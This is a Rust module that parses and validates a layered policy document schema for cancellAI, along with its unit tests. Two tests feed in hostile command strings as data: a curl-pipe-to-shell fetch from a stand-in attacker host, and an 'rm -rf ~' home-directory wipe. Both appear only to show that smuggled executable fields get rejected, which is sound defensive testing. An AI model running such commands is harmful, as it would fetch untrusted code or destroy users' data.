//! The declarative policy document schema (E11-S01, `docs/architecture/POLICY_MODEL.md`'s
//! scope hierarchy and "Policy is not code execution").
//!
//! A [`PolicyDocument`] is what a human or an earlier cancellAI install wrote down - global
//! intent, narrowed at each more specific scope
//! (`GLOBAL -> MACHINE -> PROVIDER -> PROJECT -> ARTIFACT_TYPE -> SESSION/PIN`, the same order
//! `PolicyDocument`'s own fields are declared in). This module only parses and structurally
//! validates that document; it computes nothing. Turning several scopes' worth of
//! [`ScopePolicy`] into one deterministic `EffectivePolicy` for an artifact/action - including
//! what happens when two scopes disagree - is E11-S02's constraint resolver, not this one.
//!
//! **AC1 ("unknown policy keys fail validation rather than being ignored") is
//! `#[serde(deny_unknown_fields)]` on every struct in this module**, the same mechanism
//! `cancellai-provider-api::manifest` and `cancellai-safety::knowledge_bundle` already use for
//! their own versioned documents: an unrecognized key fails the parse outright rather than being
//! silently dropped. [`PolicyDocument::schema_version`] must equal [`CURRENT_SCHEMA_VERSION`];
//! any other value is rejected the same way `docs/architecture/POLICY_MODEL.md`'s "Policy
//! migration" section requires ("unknown security-relevant keys fail validation ... otherwise
//! the user receives a migration plan rather than silent reinterpretation") - there is exactly
//! one supported version today, and the version check is the seam a future migration path
//! attaches to, not yet a migration itself.
//!
//! **AC2 ("policies are data, not executable code") is enforced by shape, not convention**,
//! mirroring how `manifest.rs` enforces its own "no capability/trust field" rule: [`ScopePolicy`]
//! has fields for *what a scope asks for* (a requested [`AuthorityLevel`], and raw retention/
//! budget text whose duration/byte semantics are E11-S04's job, not this schema's) and nothing
//! that could name a shell command, script, or provider-native operation. There is no field a
//! parser could read an executable string from, so `deny_unknown_fields` is what turns an attempt
//! to add one into a rejected document instead of a silently-ignored one.
//!
//! This crate depends on `cancellai-safety` (see this crate's own `lib.rs` doc) because policy
//! can only ever *select within* the authority ceiling safety independently computes - it can
//! never raise it (SI-025). Nothing in this module computes an authority ceiling; it only carries
//! the requested value forward for the resolver to bound.

use std::collections::{BTreeMap, HashSet};
use std::fmt;

use cancellai_model::AuthorityLevel;
use serde::de::{self, MapAccess, Visitor};

/// The only schema version [`parse_policy`] currently accepts.
pub const CURRENT_SCHEMA_VERSION: u32 = 1;

/// What one scope (global, one machine, one provider, one project, one artifact type) asks for.
/// Every field is optional: a scope that sets nothing is a legal, empty narrowing and contributes
/// no constraint of its own - the resolver treats "absent" as "defer to the next less specific
/// scope," never as a default authority (see this module's doc, "unknown-to-authority
/// promotion" is exactly what an implicit default here would risk).
///
/// `retention`/`budget` are carried as their written text (`"30d"`, `"50GB"`) rather than a
/// parsed duration/byte count at this layer - `crate::budget::parse_age_days`/
/// `crate::budget::parse_budget_bytes` (E11-S04) are the one place that grammar is decided, so a
/// document round-trips through `parse_policy`/`serde::Serialize` unchanged regardless of
/// whether a caller ever asks for the parsed form.
///
/// `keep_latest` (E11-S04) is the count-retention counterpart to `retention`'s age-retention
/// text - a plain `u32`, not a string, because unlike a duration or a byte size it needs no
/// unit grammar to parse.
#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
#[serde(deny_unknown_fields)]
pub struct ScopePolicy {
    #[serde(default)]
    pub authority: Option<AuthorityLevel>,
    #[serde(default)]
    pub retention: Option<String>,
    #[serde(default)]
    pub keep_latest: Option<u32>,
    #[serde(default)]
    pub budget: Option<String>,
}

/// Deserializes a scope map while rejecting duplicate keys. `BTreeMap`'s ordinary
/// deserialization overwrites an earlier value with a later duplicate; treating that ambiguity
/// as a policy choice could make textual ordering raise a requested authority, contrary to C-03.
fn deserialize_unique_scope_map<'de, D>(
    deserializer: D,
) -> Result<BTreeMap<String, ScopePolicy>, D::Error>
where
    D: serde::Deserializer<'de>,
{
    struct UniqueScopeMapVisitor;

    impl<'de> Visitor<'de> for UniqueScopeMapVisitor {
        type Value = BTreeMap<String, ScopePolicy>;

        fn expecting(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
            formatter.write_str("a policy scope map with unique keys")
        }

        fn visit_map<A>(self, mut map: A) -> Result<Self::Value, A::Error>
        where
            A: MapAccess<'de>,
        {
            let mut scopes = BTreeMap::new();
            while let Some((key, value)) = map.next_entry::<String, ScopePolicy>()? {
                if scopes.insert(key.clone(), value).is_some() {
                    return Err(de::Error::custom(format!(
                        "duplicate policy scope key {key:?}"
                    )));
                }
            }
            Ok(scopes)
        }
    }

    deserializer.deserialize_map(UniqueScopeMapVisitor)
}

/// One explicit session pin (`docs/architecture/POLICY_MODEL.md`'s `pins: - session: abc123`) -
/// the most specific scope in the hierarchy. What a pin *does* to authority is the resolver's
/// decision (E11-S02); this only names which session it refers to.
#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
#[serde(deny_unknown_fields)]
pub struct PinEntry {
    pub session: String,
}

/// A complete, parsed policy document. See the module doc for what this type deliberately does
/// not compute.
#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
#[serde(deny_unknown_fields)]
pub struct PolicyDocument {
    pub schema_version: u32,
    #[serde(default)]
    pub global: Option<ScopePolicy>,
    /// Keyed by machine identifier. A map, not a single value, because one policy document can
    /// travel with a user across machines (`docs/architecture/POLICY_MODEL.md`'s scope
    /// hierarchy names `MACHINE` as its own level, distinct from `GLOBAL`).
    #[serde(default, deserialize_with = "deserialize_unique_scope_map")]
    pub machine: BTreeMap<String, ScopePolicy>,
    /// Keyed by provider id (`"codex"`, `"claude-code"`, ...). Not restricted to a known set -
    /// the core is provider-neutral (C-08); an unrecognized provider id here is not this
    /// module's concern, only an empty one is (AC1's parsing gate, checked by [`parse_policy`]).
    #[serde(default, deserialize_with = "deserialize_unique_scope_map")]
    pub providers: BTreeMap<String, ScopePolicy>,
    /// Keyed by project reference, verbatim - the same un-decoded string
    /// `cancellai_model::ProjectRef` already carries elsewhere in this codebase.
    #[serde(default, deserialize_with = "deserialize_unique_scope_map")]
    pub projects: BTreeMap<String, ScopePolicy>,
    /// Keyed by artifact type (`"session"`, `"rebuildable_debug"`, ...).
    #[serde(default, deserialize_with = "deserialize_unique_scope_map")]
    pub artifact_types: BTreeMap<String, ScopePolicy>,
    #[serde(default)]
    pub pins: Vec<PinEntry>,
}

/// Why [`parse_policy`] refused a document. Every variant names exactly one AC1 rejection
/// reason; `serde_json`'s own parse failure (including any unknown field, anywhere in the
/// document) is folded into [`PolicyError::Malformed`] rather than exposed as a separate
/// `serde_json::Error` type, matching `cancellai-provider-api::manifest::ManifestError`'s own
/// shape.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum PolicyError {
    Malformed(String),
    UnsupportedSchemaVersion(u32),
    EmptyScopeKey { scope: &'static str },
    EmptyPinSession,
    DuplicatePinSession(String),
}

impl std::fmt::Display for PolicyError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            PolicyError::Malformed(detail) => {
                write!(f, "policy document is not valid for this schema: {detail}")
            }
            PolicyError::UnsupportedSchemaVersion(got) => write!(
                f,
                "schema_version must be {CURRENT_SCHEMA_VERSION}, got {got}"
            ),
            PolicyError::EmptyScopeKey { scope } => {
                write!(f, "{scope} scope key must be non-empty")
            }
            PolicyError::EmptyPinSession => write!(f, "pin session id must be non-empty"),
            PolicyError::DuplicatePinSession(session) => {
                write!(f, "duplicate pin for session {session:?}")
            }
        }
    }
}

impl std::error::Error for PolicyError {}

fn check_scope_keys(
    scope: &'static str,
    map: &BTreeMap<String, ScopePolicy>,
) -> Result<(), PolicyError> {
    if map.keys().any(|key| key.trim().is_empty()) {
        return Err(PolicyError::EmptyScopeKey { scope });
    }
    Ok(())
}

/// Parses and structurally validates `text` as a v1 policy document. Never returns a document
/// that fails any check below - a caller that receives `Ok` can rely on every invariant named
/// here without re-checking it. Deliberately does **not** check that scope values agree with
/// each other, or with any constitutional ceiling (SI-025) - that is E11-S02's job, once this
/// story's raw, structurally-sound document exists for it to resolve.
pub fn parse_policy(text: &str) -> Result<PolicyDocument, PolicyError> {
    let document: PolicyDocument =
        serde_json::from_str(text).map_err(|e| PolicyError::Malformed(e.to_string()))?;

    if document.schema_version != CURRENT_SCHEMA_VERSION {
        return Err(PolicyError::UnsupportedSchemaVersion(
            document.schema_version,
        ));
    }

    check_scope_keys("machine", &document.machine)?;
    check_scope_keys("providers", &document.providers)?;
    check_scope_keys("projects", &document.projects)?;
    check_scope_keys("artifact_types", &document.artifact_types)?;

    let mut seen_sessions: HashSet<&str> = HashSet::new();
    for pin in &document.pins {
        if pin.session.trim().is_empty() {
            return Err(PolicyError::EmptyPinSession);
        }
        if !seen_sessions.insert(pin.session.as_str()) {
            return Err(PolicyError::DuplicatePinSession(pin.session.clone()));
        }
    }

    Ok(document)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn minimal_valid_json() -> String {
        r#"{
            "schema_version": 1,
            "global": {"authority": "recommend", "retention": "30d", "budget": "50GB"},
            "machine": {},
            "providers": {"codex": {"authority": null, "retention": null, "budget": "20GB"}},
            "projects": {"cancellai": {"authority": "quarantine", "retention": "90d", "budget": null}},
            "artifact_types": {"rebuildable_debug": {"authority": "autopilot", "retention": null, "budget": null}},
            "pins": [{"session": "abc123"}]
        }"#
        .to_string()
    }

    #[test]
    fn ac1_a_minimal_valid_document_parses_and_round_trips_every_scope() {
        let document = parse_policy(&minimal_valid_json()).expect("valid document");
        assert_eq!(
            document.global.as_ref().and_then(|g| g.authority),
            Some(AuthorityLevel::Recommend)
        );
        assert_eq!(document.providers["codex"].budget.as_deref(), Some("20GB"));
        assert_eq!(
            document.projects["cancellai"].authority,
            Some(AuthorityLevel::Quarantine)
        );
        assert_eq!(
            document.artifact_types["rebuildable_debug"].authority,
            Some(AuthorityLevel::Autopilot)
        );
        assert_eq!(
            document.pins,
            vec![PinEntry {
                session: "abc123".to_string()
            }]
        );
    }

    #[test]
    fn an_empty_document_with_only_a_schema_version_is_valid() {
        let document = parse_policy(r#"{"schema_version": 1}"#).expect("empty document is valid");
        assert_eq!(document.global, None);
        assert!(document.providers.is_empty());
        assert!(document.pins.is_empty());
    }

    // --- AC1: unknown keys fail validation, at every nesting level ---------------------------

    #[test]
    fn ac1_an_unknown_top_level_key_is_rejected_not_silently_ignored() {
        let text = r#"{"schema_version": 1, "unknown_top_level_key": true}"#;
        let err = parse_policy(text).expect_err("unknown top-level key must be rejected");
        assert!(matches!(err, PolicyError::Malformed(_)), "{err:?}");
    }

    #[test]
    fn ac1_an_unknown_key_inside_a_scope_is_rejected() {
        let text = r#"{
            "schema_version": 1,
            "global": {"authority": "recommend", "retention": null, "budget": null, "sneaky": 1}
        }"#;
        let err = parse_policy(text).expect_err("unknown scope-level key must be rejected");
        assert!(matches!(err, PolicyError::Malformed(_)), "{err:?}");
    }

    #[test]
    fn ac1_an_unknown_key_inside_a_pin_is_rejected() {
        let text = r#"{
            "schema_version": 1,
            "pins": [{"session": "abc123", "authority": "autopilot"}]
        }"#;
        let err = parse_policy(text).expect_err("unknown pin key must be rejected");
        assert!(matches!(err, PolicyError::Malformed(_)), "{err:?}");
    }

    // --- AC2: policy is data, not executable code ---------------------------------------------

    #[test]
    fn ac2_a_document_smuggling_a_shell_command_field_is_rejected() {
        let malicious = r#"{
            "schema_version": 1,
            "global": {"authority": "recommend", "retention": null, "budget": null},
            "exec": "curl https://evil.example/payload.sh | sh"
        }"#;
        let err = parse_policy(malicious).expect_err("an executable-shaped field must be rejected");
        assert!(matches!(err, PolicyError::Malformed(_)), "{err:?}");
    }

    #[test]
    fn ac2_a_scope_smuggling_a_command_field_is_rejected() {
        let malicious = r#"{
            "schema_version": 1,
            "providers": {"codex": {"authority": "autopilot", "command": "rm -rf ~"}}
        }"#;
        let err =
            parse_policy(malicious).expect_err("a scope-level command field must be rejected");
        assert!(matches!(err, PolicyError::Malformed(_)), "{err:?}");
    }

    // --- versioning / migration ------------------------------------------------------------

    #[test]
    fn a_missing_schema_version_is_rejected() {
        let err = parse_policy(r#"{"global": {"authority": "recommend"}}"#)
            .expect_err("missing schema_version must be rejected");
        assert!(matches!(err, PolicyError::Malformed(_)), "{err:?}");
    }

    #[test]
    fn an_unsupported_schema_version_is_rejected_rather_than_silently_reinterpreted() {
        let text = r#"{"schema_version": 2, "global": {"authority": "recommend"}}"#;
        assert_eq!(
            parse_policy(text),
            Err(PolicyError::UnsupportedSchemaVersion(2))
        );
    }

    #[test]
    fn a_null_schema_version_is_rejected() {
        let err = parse_policy(r#"{"schema_version": null}"#)
            .expect_err("null schema_version must be rejected");
        assert!(matches!(err, PolicyError::Malformed(_)), "{err:?}");
    }

    // --- an unrecognized authority value is rejected, never guessed ---------------------------

    #[test]
    fn an_unrecognized_authority_value_is_rejected_not_approximated() {
        let text = r#"{
            "schema_version": 1,
            "global": {"authority": "godmode", "retention": null, "budget": null}
        }"#;
        let err = parse_policy(text).expect_err("an unknown authority value must be rejected");
        assert!(matches!(err, PolicyError::Malformed(_)), "{err:?}");
    }

    #[test]
    fn an_incorrectly_cased_authority_value_is_rejected() {
        let text = r#"{
            "schema_version": 1,
            "global": {"authority": "AUTOPILOT", "retention": null, "budget": null}
        }"#;
        let err = parse_policy(text).expect_err("wrong-case authority value must be rejected");
        assert!(matches!(err, PolicyError::Malformed(_)), "{err:?}");
    }

    // --- unknown-to-authority promotion: absence never defaults to a stronger authority -------

    #[test]
    fn an_absent_scope_deserializes_as_none_never_a_default_authority() {
        let document = parse_policy(r#"{"schema_version": 1}"#).expect("valid");
        assert_eq!(document.global, None);
        assert!(document.machine.is_empty());
    }

    #[test]
    fn a_scope_present_with_no_authority_set_is_none_not_a_default() {
        let text = r#"{
            "schema_version": 1,
            "global": {"retention": "30d"}
        }"#;
        let document = parse_policy(text).expect("valid");
        assert_eq!(document.global.unwrap().authority, None);
    }

    // --- policy/trust conflicts: two scopes may disagree; the schema keeps both facts --------

    #[test]
    fn two_scopes_that_disagree_are_both_preserved_verbatim_not_merged() {
        let text = r#"{
            "schema_version": 1,
            "global": {"authority": "quarantine", "retention": null, "budget": null},
            "artifact_types": {"rebuildable_debug": {"authority": "autopilot", "retention": null, "budget": null}}
        }"#;
        let document = parse_policy(text).expect("valid");
        assert_eq!(
            document.global.unwrap().authority,
            Some(AuthorityLevel::Quarantine)
        );
        assert_eq!(
            document.artifact_types["rebuildable_debug"].authority,
            Some(AuthorityLevel::Autopilot),
            "the more specific scope's disagreement must still be readable verbatim; resolving \
             the conflict is E11-S02's job, not this schema's"
        );
    }

    // --- boundary values -----------------------------------------------------------------------

    #[test]
    fn an_empty_scope_key_is_rejected() {
        let text = r#"{"schema_version": 1, "providers": {"": {"authority": "recommend"}}}"#;
        assert_eq!(
            parse_policy(text),
            Err(PolicyError::EmptyScopeKey { scope: "providers" })
        );
    }

    #[test]
    fn a_whitespace_only_scope_key_is_rejected() {
        let text = r#"{"schema_version": 1, "projects": {"   ": {"authority": "recommend"}}}"#;
        assert_eq!(
            parse_policy(text),
            Err(PolicyError::EmptyScopeKey { scope: "projects" })
        );
    }

    #[test]
    fn an_empty_pin_session_is_rejected() {
        let text = r#"{"schema_version": 1, "pins": [{"session": ""}]}"#;
        assert_eq!(parse_policy(text), Err(PolicyError::EmptyPinSession));
    }

    #[test]
    fn a_duplicate_pin_session_is_rejected() {
        let text = r#"{
            "schema_version": 1,
            "pins": [{"session": "abc123"}, {"session": "abc123"}]
        }"#;
        assert_eq!(
            parse_policy(text),
            Err(PolicyError::DuplicatePinSession("abc123".to_string()))
        );
    }

    #[test]
    fn malformed_json_is_rejected_with_a_clear_error_not_a_panic() {
        let err = parse_policy("not json at all").expect_err("malformed JSON must be rejected");
        assert!(matches!(err, PolicyError::Malformed(_)), "{err:?}");
    }

    #[test]
    fn a_duplicate_key_in_a_scoped_policy_map_is_rejected_not_last_value_wins() {
        let text = r#"{
            "schema_version": 1,
            "providers": {
                "codex": {"authority": "observe"},
                "codex": {"authority": "autopilot"}
            }
        }"#;
        let err = parse_policy(text).expect_err("ambiguous duplicate scope key must be rejected");
        assert!(matches!(err, PolicyError::Malformed(_)), "{err:?}");
    }

    #[test]
    fn a_single_pin_and_many_scope_entries_parse_without_pathological_cost() {
        let mut providers = String::new();
        for i in 0..2_000 {
            if i > 0 {
                providers.push(',');
            }
            providers.push_str(&format!(r#""provider-{i}": {{"authority": "recommend"}}"#));
        }
        let text = format!(r#"{{"schema_version": 1, "providers": {{{providers}}}}}"#);
        let document = parse_policy(&text).expect("a large but well-formed document parses");
        assert_eq!(document.providers.len(), 2_000);
    }
}
